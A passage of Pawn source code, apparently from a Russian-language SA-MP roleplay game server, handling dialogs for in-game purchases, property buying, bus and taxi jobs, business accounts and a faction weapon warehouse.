						GiveInv(playerid,451,1);
					}
					case 5:
					{
					    if(GetFree(playerid,452,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
						GiveInv(playerid,452,1);
					}
				}
		    /*	switch(GetPVarInt(playerid,"AmmoList"))
		    	{
		    	    case 0: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY),SetPVarInt(playerid,"UseSp",13),text = "курить",text1 = "Сигара расчитана";
		    	    case 1: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK),SetPVarInt(playerid,"UseSp",7);
		    	    case 2: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_BEER),SetPVarInt(playerid,"UseSp",13);
		    	    case 3: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE),SetPVarInt(playerid,"UseSp",13),SetPVarInt(playerid,"Buhlo",1);
		    	    case 4: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE),SetPVarInt(playerid,"UseSp",13),SetPVarInt(playerid,"Buhlo",2);
		    	    case 5: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE),SetPVarInt(playerid,"UseSp",13),SetPVarInt(playerid,"Buhlo",3);
		    	}
		    	static const fmt_string1[] = "Нажимайте ЛКМ, для того чтобы %s. %s на %i раз";
				new str1[sizeof(fmt_string1)+10+20];
				format(str1, sizeof(str1), fmt_string1,text,text1,GetPVarInt(playerid,"UseSp"));*/
				SendClientMessage(playerid,CREWARD,"Новый предмет добавлен в инвентарь!");
	    	}
			else
			{
			    if(GetPVarInt(playerid,"AmmoGun") > 0)
				{
				    if(GetFree(playerid,313,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
					GiveInv(playerid,313,1);
					SendClientMessage(playerid,CREWARD,"Новый предмет добавлен в инвентарь!");
				//SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK),SetPVarInt(playerid,"UseSp",7),SendClientMessage(playerid,CGREEN,"Нажимайте ЛКМ, для того чтобы пить. Питьё расчитано на 7 раз");
				}
				else
			    {
			        switch(BizInfo[GetPVarInt(playerid,"PBIZ")][bType])
			        {
			            case 12,14:
			            {
			    	        SetPlayerAttachedObject(playerid, 2, GetPVarInt(playerid,"AmmoObject"), 1, 0.096313, 0.334523, -0.267872, 109.200798, 122.924514, 313.923736, 1.025472, 1.000000, 1.000000 );
							SetPlayerSpecialAction(playerid,25);
							SetPVarInt(playerid,"Burger1",1);
							SendClientMessage(playerid,-1,"Чтобы съесть, используйте: {f7ae11}/eat");
			            }
			            case 3,4:
			            {
				    		switch(GetPVarInt(playerid,"AmmoList"))
					    	{
					    	    case 0:
								{
                                    if(GetFree(playerid,453,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
									GiveInv(playerid,453,1);
									SendClientMessage(playerid,CREWARD,"Новый предмет добавлен в инвентарь!");
									
               					//	SendClientMessage(playerid,-1,"Чтобы съесть, используйте: {f7ae11}ЛКМ");
								//	SetPlayerAttachedObject(playerid, 2, 2703, 5, 0.060999, 0.044999, -0.014000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000, 0, 0),SetPVarInt(playerid,"Burger",1);
								}
					    	    default:
					    	    {
					    	        SetPlayerAttachedObject(playerid, 2, GetPVarInt(playerid,"AmmoObject"), 1, 0.096313, 0.334523, -0.267872, 109.200798, 122.924514, 313.923736, 1.025472, 1.000000, 1.000000 );
    								SetPlayerSpecialAction(playerid,25);
    								SetPVarInt(playerid,"Burger1",1);
    								SendClientMessage(playerid,-1,"Чтобы съесть, используйте: {f7ae11}/eat");
					    	    }
					    	}
				    	}
				    	case 8:
				    	{
				    		switch(GetPVarInt(playerid,"AmmoList"))
					    	{
					    	    case 0:
								{
								    if(GetFree(playerid,454,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
									GiveInv(playerid,454,1);
									SendClientMessage(playerid,CREWARD,"Новый предмет добавлен в инвентарь!");
        					//		SendClientMessage(playerid,-1,"Чтобы съесть, используйте: {f7ae11}ЛКМ");
							//		SetPlayerAttachedObject(playerid, 2, 2702, 5, 0.060999, 0.100999, 0.005000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000, 0, 0),SetPVarInt(playerid,"Burger",1);
								}
					    	    default:
					    	    {
					    	        SetPlayerAttachedObject(playerid, 2, GetPVarInt(playerid,"AmmoObject"), 1, 0.096313, 0.334523, -0.267872, 109.200798, 122.924514, 313.923736, 1.025472, 1.000000, 1.000000 );
    								SetPlayerSpecialAction(playerid,25);
    								SetPVarInt(playerid,"Burger1",1);
    								SendClientMessage(playerid,-1,"Чтобы съесть, используйте: {f7ae11}/eat");
					    	    }
					    	}
				    	}
			    	}
			    }
			}
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
   			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
      		DeletePVar(playerid,"AmmoProd");
      		DeletePVar(playerid,"AmmoObject");
      		DeletePVar(playerid,"AmmoList");
		}
	/*	case 52:
		{
		    if(!response) return BizMenu(playerid);
		    if(CarJob[ListNick[playerid][listitem]][jidcar] == 0)
		    {
		        if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZakaz] > 0) {SendClientMessage(playerid,CGREY,"У Вас уже имеется заказ"); return BizMenu(playerid);}
		        SetPVarInt(playerid,"IDCAR",ListNick[playerid][listitem]);
		        switch(GetPVarInt(playerid,"PlayerBiz"))
		        {
		            case 57: ShowPlayerDialog(playerid,172,DIALOG_STYLE_LIST,"Преобретения транспорта","{FFFFFF}Автобус 'Эконом' (id: 431)\t\t[2500$]\nАвтобус 'Бизнес' (id: 437)\t\t[5000$]","Далее","Отмена");
		            case 4: ShowPlayerDialog(playerid,173,DIALOG_STYLE_LIST,"Преобретения транспорта","{FFFFFF}Такси 'Эконом' (id: 438)\t\t[5000$]\nТакси 'Бизнес' (id: 420)\t\t[7500$]","Далее","Отмена");
		            case 6: ShowPlayerDialog(playerid,174,DIALOG_STYLE_LIST,"Преобретения транспорта","{FFFFFF}Чистильщик улиц (id: 574)\t\t[2500$]","Далее","Отмена");
		            case 56: ShowPlayerDialog(playerid,175,DIALOG_STYLE_LIST,"Преобретения транспорта","{FFFFFF}Грузовик 'Супер эконом' (id: 459)\t[4500$]\nГрузовик 'Эконом' (id: 414)\t\t[5500$]\nГрузовик 'Бизнес' (id: 456)\t\t[7500$]","Далее","Отмена");
		            case 66: ShowPlayerDialog(playerid,327,DIALOG_STYLE_LIST,"Преобретения транспорта","{FFFFFF}Машина механика (id: 525)\t\t[5500$]","Далее","Отмена");
		        }
		    }
			else
			{
			    if(CarJob[ListNick[playerid][listitem]][jidcar] == 443) return SendClientMessage(playerid,CGREY,"Данынй транспорт нельзя продать");
				static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать транпрост бизнеса\nи получить в замен 70% от гос. стоимости?\nВы получите:{f7ae11}\n$%i{FFFFFF}\nОтдадите:\n{f7ae11}Транспорт(id: %i)";
				new str2[sizeof(fmt_string2)+32+10];
				format(str2, sizeof(str2), fmt_string2,GetProcent(CarJob[ListNick[playerid][listitem]][jcarpr]),CarJob[ListNick[playerid][listitem]][jidcar]);
				ShowPlayerDialog(playerid,176,DIALOG_STYLE_MSGBOX,"Продажа транспорта бизнеса",str2,"Да","Нет");
				SetPVarInt(playerid,"IDCAR",ListNick[playerid][listitem]);
			}
		    
			
		}*/
		case 53:
		{
		    if(!response) return true;
		    if(PlayerInfo[playerid][pCash] < BizInfo[GetPVarInt(playerid,"Biz")][bPrice]) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    if(GetPlayerBiz(playerid)) return SendClientMessage(playerid,CGREY,"Вы уже имеете бизнес");
			GiveMoney(playerid,-BizInfo[GetPVarInt(playerid,"Biz")][bPrice]);
			strmid(BizInfo[GetPVarInt(playerid,"Biz")][bOwner], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
			SetPVarInt(playerid,"PlayerBiz",GetPVarInt(playerid,"Biz"));
			BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZeml] += gettime() + 60*60*24;
			UpdateBiz(GetPVarInt(playerid,"PlayerBiz"));
			SendClientMessage(playerid,-1,"Вы купили бизнес. Управление бизнесом: {f7ae11}/biz");
			SendClientMessage(playerid,COLOR_SKLAD,"Не забудьте оплатить за бизнес в банке!");
			query = "";
			format(query, sizeof(query), "UPDATE `biz` SET `owner` = '%s', `zeml` = %i  WHERE id = '%d' LIMIT 1", BizInfo[GetPVarInt(playerid,"Biz")][bOwner],BizInfo[GetPVarInt(playerid,"Biz")][bZeml],GetPVarInt(playerid,"PlayerBiz"));
			mysql_tquery(mysql,query);
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Купил бизнес №%d (-%d$)','%d')",PlayerInfo[playerid][pID],GetPVarInt(playerid,"Biz"),BizInfo[GetPVarInt(playerid,"Biz")][bPrice],gettime());
			mysql_tquery(mysql,query);
			DeletePVar(playerid,"Biz");
		}
		case 54:
		{
		    if(!response) return 1;
		    if(PlayerInfo[playerid][pCash] < HInfo[GetPVarInt(playerid,"PHOUSE")][hCost]) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    if(GetPlayerHouse(playerid)) return SendClientMessage(playerid,CGREY,"Вы уже имеете дом");
			if(GetPlayerZasel(playerid))
			{
			    switch(GetPVarInt(playerid,"PlayerZasel"))
			    {
			        case 1: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel1","None");
			        case 2: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel2","None");
			        case 3: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel3","None");
			        case 4: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel4], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel4","None");
			    }
			    DeletePVar(playerid,"PlayerHouse");
			    DeletePVar(playerid,"PlayerZasel");
			}
			GiveMoney(playerid,-HInfo[GetPVarInt(playerid,"PHOUSE")][hCost]);
			strmid(HInfo[GetPVarInt(playerid,"PHOUSE")][hOwner], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
			HInfo[GetPVarInt(playerid,"PHOUSE")][hOplata] = gettime() + 60*60*24;
			SetPVarInt(playerid,"PlayerHouse",GetPVarInt(playerid,"PHOUSE"));
			//UpdateHome(GetPVarInt(playerid,"Biz"));
			SendClientMessage(playerid,-1,"Вы купили дом. Управление домом: {f7ae11}/house.");
			SendClientMessage(playerid,COLOR_SKLAD,"Не забудьте оплатить дом в банке!");
			if(!PlayerInfo[playerid][pQuestS][6])
			{
				PlayerQuest[playerid][6][0]++;
				CheckQuest(playerid,6);
			}
			DestroyDynamicPickup(HInfo[GetPVarInt(playerid,"PHOUSE")][hPick]);
			DestroyDynamicMapIcon(HInfo[GetPVarInt(playerid,"PHOUSE")][hMap]);
			HInfo[GetPVarInt(playerid,"PHOUSE")][hMap] = CreateDynamicMapIcon(HInfo[GetPVarInt(playerid,"PHOUSE")][hX],HInfo[GetPVarInt(playerid,"PHOUSE")][hY],HInfo[GetPVarInt(playerid,"PHOUSE")][hZ], 32, 0,-1,-1,-1,200.0);
			HInfo[GetPVarInt(playerid,"PHOUSE")][hPick] = CreateDynamicPickup(19522,23,HInfo[GetPVarInt(playerid,"PHOUSE")][hX],HInfo[GetPVarInt(playerid,"PHOUSE")][hY],HInfo[GetPVarInt(playerid,"PHOUSE")][hZ],0);
            query = "";
			format(query, sizeof(query), "UPDATE testhouse SET hOwner = '%s',hOplata = %d  WHERE id = '%d' LIMIT 1", HInfo[GetPVarInt(playerid,"PHOUSE")][hOwner],HInfo[GetPVarInt(playerid,"PHOUSE")][hOplata],GetPVarInt(playerid,"PHOUSE"));
			mysql_tquery(mysql,query);
			query = "";
         	format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Купил дом №%d (-%d$)','%d')",PlayerInfo[playerid][pID],GetPVarInt(playerid,"PHOUSE"),HInfo[GetPVarInt(playerid,"PHOUSE")][hCost],gettime());
			mysql_tquery(mysql,query);
		//	new s2tr[100];
	//		format(s2tr,sizeof(s2tr),"%s купил дом %d",PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"PHOUSE"));
		//	Log("Actor",s2tr);
		}
		case 55:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
   			if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
			//BizInfo[BusStation[GetPlayerVehicleID(playerid)]][bMoney] += 100;
			//BizInfo[BusStation[GetPlayerVehicleID(playerid)]][bProd] -= 40;
			SendClientMessage(playerid,-1,"Выберите Ваш маршрут");
			ShowPlayerDialog(playerid,56,DIALOG_STYLE_LIST,"Маршруты","{FFFFFF}№18 - ЖД Вокзал - Автошкола\n№36 - Аэропорт - Автошкола\n№42 - Отель - Автошкола","Далее","Отмена");
		}
		case 56:
		{
		    if(!response) return ShowPlayerDialog(playerid,56,DIALOG_STYLE_LIST,"Маршруты","{FFFFFF}№18 - ЖД Вокзал - Автошкола\n№36 - Аэропорт - Автошкола\n№42 - Отель - Автошкола","Далее","Отмена");
		    new text[50];
			switch(listitem)
			{
			    case 0:
				{
					text = "Маршрут: {f7ae11}№18 - ЖД Вокзал - Автошкола ";
					SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy1[0][0], Gorodskoy1[0][1], Gorodskoy1[0][2], Gorodskoy1[1][0], Gorodskoy1[1][1], Gorodskoy1[1][2], 5);
				}
		        case 1:
				{
				    text = "Маршрут: {f7ae11}№36 - Аэропорт - Автошкола";
					SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy2[0][0], Gorodskoy2[0][1], Gorodskoy2[0][2], Gorodskoy2[1][0], Gorodskoy2[1][1], Gorodskoy2[1][2], 5);
				}
				case 2:
				{
				    text = "Маршрут: {f7ae11}№42 - Отель - Автошкола";
					SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy3[0][0], Gorodskoy3[0][1], Gorodskoy3[0][2], Gorodskoy3[1][0], Gorodskoy3[1][1], Gorodskoy3[1][2], 5);
				}
			}
			if(PlayerInfo[playerid][pCash] < 50)
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    RemovePlayerFromVehicle(playerid);
			    return true;
			}
			GiveMoney(playerid,-50);
			RentCar[GetPlayerVehicleID(playerid)] = playerid;
			SetPVarInt(playerid,"Bus",GetPlayerVehicleID(playerid));
			SetPVarInt(playerid,"Mar",listitem+1);
			SetPVarInt(playerid,"Check",0);
            SendClientMessage(playerid,-1,"Для того, чтобы закончить работу используйте: {f7ae11}/end");
			UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,text);
			for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
		}
		case 58:
		{
		    if(!response) return ShowPlayerDialog(playerid,58,DIALOG_STYLE_INPUT,"Установите тариф","{FFFFFF}Установите сколько вы будете брать за 1 км:","Далее","Отмена");
		    new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,58,DIALOG_STYLE_INPUT,"Установите тариф","{FFFFFF}Установите сколько вы будете брать за 1 км:","Далее","Отмена");
		    if(krek < 10 || krek > 1000)
		    {
		        SendClientMessage(playerid,CGREY,"Тариф может быть от 10 до 1000");
		        ShowPlayerDialog(playerid,58,DIALOG_STYLE_INPUT,"Установите тариф","{FFFFFF}Установите сколько вы будете брать за 1 км:","Далее","Отмена");
		        return true;
		    }
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 420)
			{
				PlayerInfo[playerid][pShash] = 0;
				VInfo[GetPVarInt(playerid,"IDCARDD")][vobj1] = CreateDynamicObject(19308,0,0,0,0,0,0);
				AttachDynamicObjectToVehicle(VInfo[GetPVarInt(playerid,"IDCARDD")][vobj1],GetPlayerVehicleID(playerid),0,-0.15,GetPVarFloat(playerid,"IDCARDDF"),0,0,0);
			}
			else SendClientMessage(playerid,-1,"Для того, чтобы закончить работу используйте: {f7ae11}/end");
			SetPVarInt(playerid,"Taxist",1);
			DeletePVar(playerid,"IDCARDD");
			DeletePVar(playerid,"IDCARDDF");
		    new str[70];
		    format(str,sizeof(str),"Тариф: {f7ae11}$%i\n{ffffff}[Бесплатно для новичков]",krek);
		    SetPVarInt(playerid,"Mar",10);
		    SetPVarInt(playerid,"MarTaxi",krek);
		    UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,str);
   		//	CarLable[GetPlayerVehicleID(playerid)] = CreateDynamic3DTextLabel( str, -1, 0.0, 0.0, 1.0, 10.0, INVALID_PLAYER_ID,GetPlayerVehicleID(playerid), 1 );
	//		Attach3DTextLabelToVehicle(CarLable[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.0, 0.0, 1.0);
			for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
		}
        case 59:
		{
		    if(!response) return true;
   			new krek;
		    if(sscanf(inputtext,"i",krek) || krek < 1) return ShowPlayerDialog(playerid,59,DIALOG_STYLE_INPUT,"Пожертвование","{FFFFFF}Введите сколько хотите пожертвовать:","Далее","Назад");
		    if(PlayerInfo[playerid][pBank] < krek)
		    {
		        SendClientMessage(playerid,CGREY,"Недостаточно средств на счету");
		        ShowPlayerDialog(playerid,59,DIALOG_STYLE_INPUT,"Пожертвование","{FFFFFF}Введите сколько хотите пожертвовать:","Далее","Назад");
		        return true;
		    }
		    PlayerInfo[playerid][pBank] -= krek;
		    SetPlayerInt(PlayerInfo[playerid][pSendername],"bank",PlayerInfo[playerid][pBank]);
			static const fmt_string1[] = "[BANK]{FFFFFF} Вы пожертвовали $%i. Новый баланс: $%i ";
			new str1[sizeof(fmt_string1)+10+10];
			format(str1, sizeof(str1), fmt_string1,krek,PlayerInfo[playerid][pBank]);
			SendClientMessage(playerid,CREWARD,str1);
			Kazna += krek;
			SetMatsInt("kazna",Kazna);
		}
		case 60:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
			if(PlayerInfo[playerid][pCash] < 50)
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    RemovePlayerFromVehicle(playerid);
			    return true;
			}
   			if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
			GiveMoney(playerid,-50);
			SetPVarInt(playerid,"Bus",GetPlayerVehicleID(playerid));
			SetPVarInt(playerid,"Mar",25);
			RentCar[GetPlayerVehicleID(playerid)] = playerid;
			SendClientMessage(playerid,-1,"Вы арендовали машину механиков. Ждите вызовов или патрулируйте город");
			SendClientMessage(playerid,-1,"Для того, чтобы закончить работу используйте: {f7ae11}/end");
			UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,"");
			SetPVarInt(playerid,"Meh",1);
			for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
		}
		case 61:
		{
			switch(response)
			{
			    case 1:
			    {
	    			new krek;
				    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid, 61, DIALOG_STYLE_INPUT, "Снять со счета бизнеса","{FFFFFF}Укажите сумму снятие со счета бизнеса:" , "Готово","Назад");
                    if(krek < 0 || krek > 10000000) return true;
					if(krek > BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney])
				    {
				        SendClientMessage(playerid,CGREY,"Недостаточно денег на счету бизнеса");
				        ShowPlayerDialog(playerid, 61, DIALOG_STYLE_INPUT, "Снять со счета бизнеса","{FFFFFF}Укажите сумму снятие со счета бизнеса:" , "Готово","Назад");
				        return true;
				    }
				    BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] -= krek;
				    GiveMoney(playerid,krek);
				    SetPlayerInt(PlayerInfo[playerid][pSendername],"cash",PlayerInfo[playerid][pCash]);
   					static const fmt_string1[] = "Вы сняли со счета бизнеса $%i. Новый счет: $%i ";
					new str1[sizeof(fmt_string1)+10+10];
					format(str1, sizeof(str1), fmt_string1,krek,BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney]);
					SendClientMessage(playerid,-1,str1);
					SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"money",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney]);
				}
				default: return true;
			}
		}
		case 62:
		{
			switch(response)
			{
			    case 1:
			    {
	    			new krek;
				    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid, 62, DIALOG_STYLE_INPUT, "Полонить счет бизнеса","{FFFFFF}Укажите сумму пополнения счета бизнеса:" , "Готово","Назад");
                    if(krek < 0 || krek > 10000000) return true;
					if(krek > PlayerInfo[playerid][pCash])
				    {
				        SendClientMessage(playerid,CGREY,"Недостаточно средств");
						ShowPlayerDialog(playerid, 62, DIALOG_STYLE_INPUT, "Полонить счет бизнеса","{FFFFFF}Укажите сумму пополнения счета бизнеса:" , "Готово","Назад");
				        return true;
				    }
				    BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] += krek;
				    GiveMoney(playerid,-krek);
				    SetPlayerInt(PlayerInfo[playerid][pSendername],"cash",PlayerInfo[playerid][pCash]);
   					static const fmt_string1[] = "Вы пополнили счет бизнеса на $%i. Новый счет: $%i ";
					new str1[sizeof(fmt_string1)+10+10];
					format(str1, sizeof(str1), fmt_string1,krek,BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney]);
					SendClientMessage(playerid,-1,str1);
					SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"money",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney]);
				}
				default: return true;
			}
		}
		case 63:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0: SetPVarInt(playerid,"VGun",23),ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
		        case 1: SetPVarInt(playerid,"VGun",24),ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
		        case 2: SetPVarInt(playerid,"VGun",25),ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
		        case 3: SetPVarInt(playerid,"VGun",30),ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
		        case 4: SetPVarInt(playerid,"VGun",31),ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
		        case 5: SetPVarInt(playerid,"VGun",29),ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
		        case 6:
		        {
		            GivePlayerWeapon(playerid,3,1);
                    static const fmt_string[] = "[R] %s взял Дубинку со склада. На складе: %i материалов";
					new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5];
					format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
					SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
					ShowPlayerDialog(playerid,63,DIALOG_STYLE_LIST,"Выберете оружие","{FFFFFF}Silenced 9mm\nDesert Eagle\nShotgun\nAK-47\nM4\nMP5\nДубинка\nБронижелет","Далее","Назад");
		        }
				case 7:
				{
				    SetArmour(playerid,100);
                    static const fmt_string[] = "[R] %s взял Бронижелет со склада. На складе: %i материалов";
					new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5];
					format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
					SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
					ShowPlayerDialog(playerid,63,DIALOG_STYLE_LIST,"Выберете оружие","{FFFFFF}Silenced 9mm\nDesert Eagle\nShotgun\nAK-47\nM4\nMP5\nДубинка\nБронижелет","Далее","Назад");
				}
				case 8: ShowPlayerDialog(playerid,41,DIALOG_STYLE_INPUT,"Положить материалы","{FFFFFF}Введите сколько материалов хотите положить:","Далее","Назад");
				case 9: ShowPlayerDialog(playerid,39,DIALOG_STYLE_INPUT,"Взять материалы","{FFFFFF}Введите сколько материалов хотите взять:","Далее","Назад");
			}
			//ShowPlayerDialog(playerid,63,DIALOG_STYLE_LIST,"Выберете оружие","{FFFFFF}Silenced 9mm\nDesert Eagle\nShotgun\nAK-47\nM4\nMP5\nДубинка\nБронижелет","Далее","Назад");
		}
		case 64:
		{
		    if(!response) return ShowPlayerDialog(playerid,63,DIALOG_STYLE_LIST,"Выберете оружие","{FFFFFF}Silenced 9mm\nDesert Eagle\nShotgun\nAK-47\nM4\nMP5\nДубинка\nБронижелет","Далее","Назад");
   			new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
			if(krek < 1 || krek > 150)
		    {
		        SendClientMessage(playerid,CGREY,"Можно взять от 1 до 150 патронов");
		    	ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
		    	return true;
		    }
		    if(gettime() > PlayerInfo[playerid][pMatiTick]) PlayerInfo[playerid][pMati] = 0;
		    if(PlayerInfo[playerid][pMati]+krek > 100*PlayerInfo[playerid][pRank] && gettime() < PlayerInfo[playerid][pMatiTick])
		    {
		 		SendClientMessage(playerid,CGREY,"Вы исчерпали лимит патронов в 20 минут");
		    	ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
		    	return true;
		    }
		    if(FracMats[PlayerInfo[playerid][pMember]] < GetPVarInt(playerid,"VGun")*krek/5)
		    {
		        SendClientMessage(playerid,CGREY,"Недостаточно материалов на складе");
		    	ShowPlayerDialog(playerid,64,DIALOG_STYLE_INPUT,"Выберете количество патронов","{FFFFFF}Введите сколько вы хотите получить патронов:","Далее","Назад");
		    	return true;
		    }
		    if(PlayerInfo[playerid][pMati] == 0) PlayerInfo[playerid][pMatiTick] = gettime()+60*20;
			if(PlayerInfo[playerid][pMati]+krek > 100*PlayerInfo[playerid][pRank])
			{
			    SendClientMessage(playerid,CGREY,"Лимит привышен!");
				return 1;
			}
		    PlayerInfo[playerid][pMati] += krek;
		    FracMats[PlayerInfo[playerid][pMember]] -= GetPVarInt(playerid,"VGun")*krek/5;
   			new gunname[32];
    		GetWeaponName(GetPVarInt(playerid,"VGun"),gunname,sizeof(gunname));
      		static const fmt_string[] = "[R] %s взял %s(%i пт) со склада. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],gunname,krek,FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			GivePlayerWeapon(playerid,GetPVarInt(playerid,"VGun"),krek);
			DeletePVar(playerid,"VGun");
			static const fmt_string1[] = "Вы взяли оружие со склада, лимит патронов в 20 минут [%i/%i]";
			new str1[sizeof(fmt_string1)+5];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pMati],100*PlayerInfo[playerid][pRank]);
			SendClientMessage(playerid,CBLUE,str1);
			ShowPlayerDialog(playerid,63,DIALOG_STYLE_LIST,"Выберете оружие","{FFFFFF}Silenced 9mm\nDesert Eagle\nShotgun\nAK-47\nM4\nMP5\nДубинка\nБронижелет","Далее","Назад");
		}
		case 65:
		{
		    if(!response) return true;
   			new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,65,DIALOG_STYLE_INPUT,"Пополнение счета","{FFFFFF}Введите на сколько хотите пополнить Ваш счет:","Далее","Назад");
		    if(krek > PlayerInfo[playerid][pCash])
		    {
